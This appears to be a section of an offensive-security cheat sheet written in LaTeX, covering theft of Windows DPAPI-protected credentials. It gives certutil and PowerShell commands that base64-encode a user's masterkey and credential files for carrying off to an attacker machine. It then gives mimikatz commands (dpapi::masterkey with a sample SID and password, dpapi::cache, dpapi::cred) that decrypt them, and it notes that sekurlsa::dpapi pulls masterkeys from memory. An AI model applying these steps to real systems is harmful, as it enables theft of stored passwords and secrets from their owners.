\section{Data Protection API (DPAIP)}

\subsection{exfiltrate the files to a windows attacker}

the files must be converted to base64.

cmd:
\begin{verbatim}
cd %appdata%\Microsoft\Protect\<SID>
certutil -encode <masterkey> C:\temp\mkey
\end{verbatim}

with powershell:
\begin{verbatim}
cd %appdata%\Microsoft\Protect\<SID>
[Convert]::ToBase64String([IO.File]::ReadAllBytes(".\<masterkey>"))
\end{verbatim}

do the same thing for content file
(\verb+%localappdata\Microsoft\Credentials\XXX+)



\subsection{Mimikatzi on attacker}

files must be decoded. Next, using mimikatz we're going to decrypt the
masterkey indicating the user's SID and password. mimikatz~\ref{tools:mimikatz}
module \verb+dpapi::masterkey+ with the appropriate arguments (\verb+/pvk+ or
\verb+/rpc+) to decrypt it.

\begin{verbatim}
mimikatz # dpapi::masterkey /in:<masterkey_path>
    /sid:S-1-5-21-953262931-566350628-63446256-1001 
    /password:4Cc3ssC0ntr0ller
\end{verbatim}

If everything works as expected, mimikatz should place the decrypted masterkey
in cache.

\begin{verbatim}
mimikatz # dpapi::cache
\end{verbatim}


Now we can read the credentials file using mimikatz module \verb+dpapi::cred+
with the appropiate \verb+/masterkey+ to decrypt.

\begin{verbatim}
mimikatz # dpapi::cred /in:<cred_path>
\end{verbatim}

You can extract many DPAPI masterkeys from memory with the
\verb+sekurlsa::dpapi+ module (if you are root).


